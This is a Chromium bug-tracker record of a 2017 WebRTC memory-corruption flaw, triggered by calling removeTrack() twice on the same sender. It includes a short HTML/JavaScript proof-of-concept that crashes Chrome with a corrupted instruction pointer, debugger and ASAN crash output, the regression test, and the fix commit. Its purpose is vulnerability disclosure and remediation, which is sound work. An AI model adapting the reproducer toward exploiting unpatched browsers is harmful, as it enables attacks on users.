# Security: WebRTC - Memory corruption in PeerConnection::RemoveTrack()

| Field | Value |
|-------|-------|
| **Issue ID** | [40089935](https://issues.chromium.org/issues/40089935) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>WebRTC>PeerConnection, Internals>Media |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, iOS, ChromeOS |
| **Reporter** | lo...@gmail.com |
| **Assignee** | hb...@chromium.org |
| **Created** | 2017-12-17 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

Steps to reproduce:

```
1.Open PoC RemoveFromPeerConnection_PoC.html in Chrome browser.  
2.Chrome crashes by executing invalid address pointed to by corrupted EIP from PeerConnection::RemoveTrack().  

	(1b00.3d28): Access violation - code c0000005 (!!! second chance !!!)  
	eax=08d52780 ebx=08d52900 ecx=08d52900 edx=052f5928 esi=08e58840 edi=05be7cd0  
	eip=3489bc0a esp=0934f33c ebp=0934f43c iopl=0         nv up ei ng nz ac po cy  
	cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010293  
	3489bc0a ??              ???  

```

**VERSION**  

Chrome Version: Google Chrome 65.0.3294.5 (Official Build) dev (32-bit) (cohort: Dev)  

Operating System: Windows 10

**REPRODUCTION CASE** (RemoveFromPeerConnection\_PoC.html)  

<script>  

var context = new AudioContext();  

var streamDestNode = context.createMediaStreamDestination();  

var rtcConfig = { "iceServers": [{ "urls": "stun:stun2.l.google.com:19302" }, ] };  

var options = {optional:[{DtlsSrtpKeyAgreement:true}, {RtpDataChannels: false}]};  

var pc = new RTCPeerConnection(rtcConfig,options);  

var rtpSender = pc.addTrack(streamDestNode.stream.getTracks()[0], streamDestNode.stream);  

pc.removeTrack(rtpSender);  

pc.removeTrack(rtpSender);  

</script>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

```
(1b00.3d28): Access violation - code c0000005 (!!! second chance !!!)  
eax=08d52780 ebx=08d52900 ecx=08d52900 edx=052f5928 esi=08e58840 edi=05be7cd0  
eip=3489bc0a esp=0934f33c ebp=0934f43c iopl=0         nv up ei ng nz ac po cy  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010293  
3489bc0a ??              ???  
8:068> !analyze -v  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
\*                                                                             \*  
\*                        Exception Analysis                                   \*  
\*                                                                             \*  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  

GetUrlPageData2 (WinHttp) failed: 12002.  

DUMP_CLASS: 2  

DUMP_QUALIFIER: 0  

FAULTING_IP:   
+0  
3489bc0a ??              ???  

EXCEPTION_RECORD:  (.exr -1)  
ExceptionAddress: 3489bc0a  
   ExceptionCode: c0000005 (Access violation)  
  ExceptionFlags: 00000000  
NumberParameters: 2  
   Parameter[0]: 00000008  
   Parameter[1]: 3489bc0a  
Attempt to execute non-executable address 3489bc0a  

FAULTING_THREAD:  00003d28  

DEFAULT_BUCKET_ID:  SOFTWARE_NX_FAULT  

PROCESS_NAME:  chrome.exe  

ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.  

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.  

EXCEPTION_CODE_STR:  c0000005  

EXCEPTION_PARAMETER1:  00000008  

EXCEPTION_PARAMETER2:  3489bc0a  

FOLLOWUP_IP:   
chrome_child!webrtc::PeerConnection::RemoveTrack+92 [C:\b\c\b\win_clang\src\third_party\webrtc\pc\peerconnection.cc @ 1071]  
1251822e 85c0            test    eax,eax  

FAILED_INSTRUCTION_ADDRESS:   
+0  
3489bc0a ??              ???  

BUGCHECK_STR:  SOFTWARE_NX_FAULT  

WATSON_BKT_PROCSTAMP:  5a338023  

WATSON_BKT_PROCVER:  65.0.3294.5  

PROCESS_VER_PRODUCT:  Google Chrome  

WATSON_BKT_MODULE:  unknown  

WATSON_BKT_MODVER:  0.0.0.0  

WATSON_BKT_MODOFFSET:  3489bc0a  

WATSON_BKT_MODSTAMP:  bbbbbbb4  

BUILD_VERSION_STRING:  10.0.15063.296 (WinBuild.160101.0800)  

MODLIST_WITH_TSCHKSUM_HASH:  34f7f4d2cb563c229f5bfe80a0e9d00e944a665f  

MODLIST_SHA1_HASH:  123047805c2fe67a74099d902e9118547ddc7488  

NTGLOBALFLAG:  0  

APPLICATION_VERIFIER_FLAGS:  0  

PRODUCT_TYPE:  1  

SUITE_MASK:  784  

ANALYSIS_SESSION_HOST:  DESKTOP-42C0TR5  

ANALYSIS_SESSION_TIME:  12-17-2017 12:50:24.0120  

ANALYSIS_VERSION: 10.0.14321.1024 x86fre  

IP_ON_HEAP:  3489bc0a  
The fault address in not in any loaded module, please check your build's rebase  
log at <releasedir>\bin\build_logs\timebuild\ntrebase.log for module which may  
contain the address if it were loaded.  

IP_IN_FREE_BLOCK: 3489bc0a  

THREAD_ATTRIBUTES:   
OS_LOCALE:  ENZ  

PROBLEM_CLASSES:   



SOFTWARE_NX_FAULT  
	Tid    [0x3d28]  
	Frame  [0x00]: unknown!unknown  


LAST_CONTROL_TRANSFER:  from 1251822e to 3489bc0a  

STACK_TEXT:    
WARNING: Frame IP not in any known module. Following frames may be wrong.  
0934f338 1251822e 00000002 00000000 05b98b18 0x3489bc0a  
0934f43c 12501833 08d52900 009ae504 0934f45c chrome_child!webrtc::PeerConnection::RemoveTrack+0x92  
0934f44c 1240c628 00000000 1381cb18 0934f4cc chrome_child!webrtc::MethodCall1<webrtc::PeerConnectionInterface,bool,const webrtc::IceCandidateInterface \*>::OnMessage+0xf  
0934f45c 12548e66 0934f4e8 0934f480 0fd311aa chrome_child!webrtc::internal::SynchronousMethodCall::OnMessage+0x10  
0934f4cc 1254935a 0934f4e8 00000002 05be7cd8 chrome_child!jingle_glue::JingleThreadWrapper::Dispatch+0x38  
0934f520 0fda1af1 00000008 12549248 0934f570 chrome_child!jingle_glue::JingleThreadWrapper::RunTask+0x112  
0934f53c 0fd7d7c7 08d56c20 00000000 00000000 chrome_child!base::internal::Invoker<base::internal::BindState<void (media::AudioRendererImpl::\*)(media::PipelineStatus) __attribute__((thiscall)),base::WeakPtr<media::AudioRendererImpl>,media::PipelineStatus>,void ()>::Run+0x41  
0934f5ac 0fd7d723 12f8b46c 0934f668 0934f640 chrome_child!base::debug::TaskAnnotator::RunTask+0x97  
0934f5bc 0fd7d286 0934f668 13636c76 05b50b00 chrome_child!base::internal::IncomingTaskQueue::RunTask+0x13  
0934f640 0fd7d0a5 0934f668 0fd7bccc 4d355098 chrome_child!base::MessageLoop::RunTask+0x1b6  
0934f660 0fd74e4e 00000000 13636c9a 13636c76 chrome_child!base::MessageLoop::DeferOrRunPendingTask+0x55  
0934f714 0fd74d57 05bd8d90 05bd8d88 05b50a94 chrome_child!base::MessageLoop::DoWork+0xde  
0934f730 0fd74caf 05b50a90 0934f774 0934f754 chrome_child!base::MessagePumpDefault::Run+0x87  
0934f740 0fd74aef 00000001 05bbb8f4 0934f774 chrome_child!base::MessageLoop::Run+0x1f  
0934f754 0fd74abb 0934f79c 0fd74933 0934f774 chrome_child!base::RunLoop::Run+0x2f  
0934f75c 0fd74933 0934f774 05b50a90 00000000 chrome_child!base::Thread::Run+0xb  
0934f79c 10e66df9 05bbb8f4 000004e0 000004e0 chrome_child!base::Thread::ThreadMain+0x153  
0934f7c0 749c8744 05b98530 749c8720 9837b252 chrome_child!base::`anonymous namespace'::ThreadFunc+0xb9  
0934f7d4 77af582d 05b98530 79ae993b 00000000 KERNEL32!BaseThreadInitThunk+0x24  
0934f81c 77af57fd ffffffff 77b16392 00000000 ntdll!__RtlUserThreadStart+0x2f  
0934f82c 00000000 10e66d40 05b98530 00000000 ntdll!_RtlUserThreadStart+0x1b  


THREAD_SHA1_HASH_MOD_FUNC:  8ea58f03b96129606bc576574062aedd9526f044  

THREAD_SHA1_HASH_MOD_FUNC_OFFSET:  351508b5aff37c745ed468f639bbe5e323fb4191  

THREAD_SHA1_HASH_MOD:  9b64e0075d59a948731a1605c0b4efa98dea7a57  

FAULT_INSTR_CODE:  e74c085  

FAULTING_SOURCE_LINE:  C:\b\c\b\win_clang\src\third_party\webrtc\pc\peerconnection.cc  

FAULTING_SOURCE_FILE:  C:\b\c\b\win_clang\src\third_party\webrtc\pc\peerconnection.cc  

FAULTING_SOURCE_LINE_NUMBER:  1071  

SYMBOL_STACK_INDEX:  1  

SYMBOL_NAME:  chrome_child!webrtc::PeerConnection::RemoveTrack+92  

FOLLOWUP_NAME:  MachineOwner  

MODULE_NAME: chrome_child  

IMAGE_NAME:  chrome_child.dll  

DEBUG_FLR_IMAGE_TIMESTAMP:  5a337ed2  

STACK_COMMAND:  ~68s ; kb  

FAILURE_BUCKET_ID:  SOFTWARE_NX_FAULT_c0000005_chrome_child.dll!webrtc::PeerConnection::RemoveTrack  

BUCKET_ID:  SOFTWARE_NX_FAULT_BAD_IP_chrome_child!webrtc::PeerConnection::RemoveTrack+92  

PRIMARY_PROBLEM_CLASS:  SOFTWARE_NX_FAULT_BAD_IP_chrome_child!webrtc::PeerConnection::RemoveTrack+92  

FAILURE_EXCEPTION_CODE:  c0000005  

FAILURE_IMAGE_NAME:  chrome_child.dll  

BUCKET_ID_IMAGE_STR:  chrome_child.dll  

FAILURE_MODULE_NAME:  chrome_child  

BUCKET_ID_MODULE_STR:  chrome_child  

FAILURE_FUNCTION_NAME:  webrtc::PeerConnection::RemoveTrack  

BUCKET_ID_FUNCTION_STR:  webrtc::PeerConnection::RemoveTrack  

BUCKET_ID_OFFSET:  92  

BUCKET_ID_MODTIMEDATESTAMP:  5a337ed2  

BUCKET_ID_MODCHECKSUM:  3d42f63  

BUCKET_ID_MODVER_STR:  65.0.3294.5  

BUCKET_ID_PREFIX_STR:  SOFTWARE_NX_FAULT_BAD_IP_  

FAILURE_PROBLEM_CLASS:  SOFTWARE_NX_FAULT  

FAILURE_SYMBOL_NAME:  chrome_child.dll!webrtc::PeerConnection::RemoveTrack  

WATSON_STAGEONE_URL:  http://watson.microsoft.com/StageOne/chrome.exe/65.0.3294.5/5a338023/unknown/0.0.0.0/bbbbbbb4/c0000005/3489bc0a.htm?Retriage=1  

TARGET_TIME:  2017-12-16T23:50:42.000Z  

OSBUILD:  15063  

OSSERVICEPACK:  296  

SERVICEPACK_NUMBER: 0  

OS_REVISION: 0  

OSPLATFORM_TYPE:  x86  

OSNAME:  Windows 10  

OSEDITION:  Windows 10 WinNt SingleUserTS Personal  

USER_LCID:  0  

OSBUILD_TIMESTAMP:  unknown_date  

BUILDDATESTAMP_STR:  160101.0800  

BUILDLAB_STR:  WinBuild  

BUILDOSVER_STR:  10.0.15063.296  

ANALYSIS_SESSION_ELAPSED_TIME: 9958  

ANALYSIS_SOURCE:  UM  

FAILURE_ID_HASH_STRING:  um:software_nx_fault_c0000005_chrome_child.dll!webrtc::peerconnection::removetrack  

FAILURE_ID_HASH:  {8dd97ce9-008b-c2fa-d8f1-2086df973582}  

Followup:     MachineOwner  
---------  

```

## Attachments

- [RemoveFromPeerConnection_PoC.html](attachments/RemoveFromPeerConnection_PoC.html) (text/plain, 476 B)

## Timeline

### cl...@chromium.org (2017-12-17)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5492461605748736.

### el...@chromium.org (2017-12-17)

[Empty comment from Monorail migration]

[Monorail components: Blink>WebRTC>PeerConnection]

### cl...@chromium.org (2017-12-17)

Detailed report: https://clusterfuzz.com/testcase?key=5492461605748736

Job Type: linux_asan_chrome_mp
Crash Type: Heap-buffer-overflow READ 8
Crash Address: 0x6090001cb868
Crash State:
  content::RTCRtpSender::RemoveFromPeerConnection
  content::RTCPeerConnectionHandler::RemoveTrack
  blink::RTCPeerConnection::removeTrack
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=522107:522111

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5492461605748736

See https://github.com/google/clusterfuzz-tools for more information.

A recommended severity was added to this bug. Please change the severity if it is inaccurate.


### cl...@chromium.org (2017-12-17)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the Test-Predator-Wrong-Components label.

[Monorail components: Internals>Media]

### cl...@chromium.org (2017-12-17)

Automatically assigning owner based on suspected regression changelist https://chromium.googlesource.com/chromium/src/+/3b9232c5c2acd26e4a55b7d855e1eccd2bc6d598 (Move RemoveTrack logic to RTCRtpSender::RTCRtpSenderInternal.).

If this is incorrect, please remove the owner and apply the Test-Predator-Wrong-CLs label.

### sh...@chromium.org (2017-12-18)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-12-18)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2017-12-18)

[Empty comment from Monorail migration]

### hb...@chromium.org (2017-12-19)

Taking a look.

### hb...@chromium.org (2017-12-19)

+CC webrtc layer folks since that's where the crash happens, whether or not content needs to be updated not to call it.

### hb...@chromium.org (2017-12-19)

WPT repro case added to external/wpt/webrtc/RTCPeerConnection-setRemoteDescription-tracks.https.html:

  async_test(t => {
    const pc = new RTCPeerConnection();
    return getUserMediaTracksAndStreams(1)
    .then(t.step_func(([tracks, streams]) => {
      const sender = pc.addTrack(tracks[0]);
      assert_not_equals(sender, null);
      pc.removeTrack(sender);
      pc.removeTrack(sender);
      t.done();
    }))
    .catch(t.step_func(reason => {
      assert_unreached(reason);
    }));
  }, 'removeTrack() twice is safe.');

out/gn/content_shell --run-layout-test external/wpt/webrtc/RTCPeerConnection-setRemoteDescription-tracks.https.html

Hits this DCHECK, will make a CL aborting as per-spec if sender does not belong to the PC:
https://cs.chromium.org/chromium/src/content/renderer/media/rtc_peer_connection_handler.cc?q=rtc_peer_connection_handler.cc&sq=package:chromium&dr&l=1921

### hb...@chromium.org (2017-12-19)

In CQ: https://chromium-review.googlesource.com/c/chromium/src/+/833931

### bu...@chromium.org (2017-12-19)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/364b9ebdd6afe194f6bb619570583738feae5f4b

commit 364b9ebdd6afe194f6bb619570583738feae5f4b
Author: Henrik Boström <hbos@chromium.org>
Date: Tue Dec 19 16:15:49 2017

Fix removeTrack() crash.

Before this CL calling removeTrack(sender) twice in a row with the same
sender would cause a DCHECK crash. Fixes the crash by aborting the
operation if the sender is not found, which is spec-compliant[1].

[1] https://w3c.github.io/webrtc-pc/#dom-rtcpeerconnection-removetrack

Bug: 795569
Change-Id: I8a6dd770885a39b5f8c5fb13c34529d604ea83b3
Reviewed-on: https://chromium-review.googlesource.com/833931
Reviewed-by: Guido Urdaneta <guidou@chromium.org>
Commit-Queue: Henrik Boström <hbos@chromium.org>
Cr-Commit-Position: refs/heads/master@{#525050}
[modify] https://crrev.com/364b9ebdd6afe194f6bb619570583738feae5f4b/content/renderer/media/rtc_peer_connection_handler.cc
[modify] https://crrev.com/364b9ebdd6afe194f6bb619570583738feae5f4b/third_party/WebKit/LayoutTests/external/wpt/webrtc/RTCPeerConnection-setRemoteDescription-tracks.https-expected.txt
[modify] https://crrev.com/364b9ebdd6afe194f6bb619570583738feae5f4b/third_party/WebKit/LayoutTests/external/wpt/webrtc/RTCPeerConnection-setRemoteDescription-tracks.https.html


### hb...@chromium.org (2017-12-19)

Requesting merge for M64 of commit 364b9ebdd6afe194f6bb619570583738feae5f4b. Reassigning to guidou while I'm OOO.

### ca...@chromium.org (2017-12-19)

Please add affected OSs.

### de...@chromium.org (2017-12-19)

Assuming all unless hbos or guidou indicates otherwise.

### sh...@chromium.org (2017-12-19)

This bug requires manual review: M64 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: cmasso@(Android), cmasso@(iOS), kbleicher@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ab...@google.com (2017-12-19)

Seems like this just landed in Canary today, so lets let it bake a few more days. 

### cl...@chromium.org (2017-12-20)

ClusterFuzz has detected this issue as fixed in range 525049:525050.

Detailed report: https://clusterfuzz.com/testcase?key=5492461605748736

Job Type: linux_asan_chrome_mp
Crash Type: Heap-buffer-overflow READ 8
Crash Address: 0x6090001cb868
Crash State:
  content::RTCRtpSender::RemoveFromPeerConnection
  content::RTCPeerConnectionHandler::RemoveTrack
  blink::RTCPeerConnection::removeTrack
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=522107:522111
Fixed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=525049:525050

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5492461605748736

See https://github.com/google/clusterfuzz-tools for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### cl...@chromium.org (2017-12-20)

ClusterFuzz testcase 5492461605748736 is verified as fixed, so closing issue as verified.

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### sh...@chromium.org (2017-12-20)

[Empty comment from Monorail migration]

### ab...@google.com (2017-12-20)

deadbeef@ - how does this look in Canary?

### de...@chromium.org (2017-12-21)

Looks good to me. Ran the repro testcase with no issue, which as I understand, was 100% reproducible. Plus ClusterFuzz verified it.

### ab...@google.com (2017-12-21)

Approving it for merge. Branch:3282

### gu...@chromium.org (2017-12-21)

Assigning back to hbos@ since there is a conflict to merge to M64.
The code looks quite different, so maybe the problem was introduced in M65?

### de...@chromium.org (2017-12-22)

Yeah, it definitely appears it was introduced in M65, specifically in https://chromium-review.googlesource.com/c/chromium/src/+/808284. So fixing labels.

### hb...@chromium.org (2017-12-27)

Thanks for looking into this while I was away! Cool, no merge needed then.

### aw...@google.com (2018-01-02)

[Empty comment from Monorail migration]

### mb...@google.com (2018-01-03)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-01-05)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-01-06)

Nice one, the VRP panel decided to award $3,000 for this report. Cheers!

### aw...@chromium.org (2018-01-06)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-02-13)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-03-27)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-03-28)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2018-03-28)

This issue was migrated from crbug.com/chromium/795569?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>WebRTC>PeerConnection, Internals>Media]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40089935)*
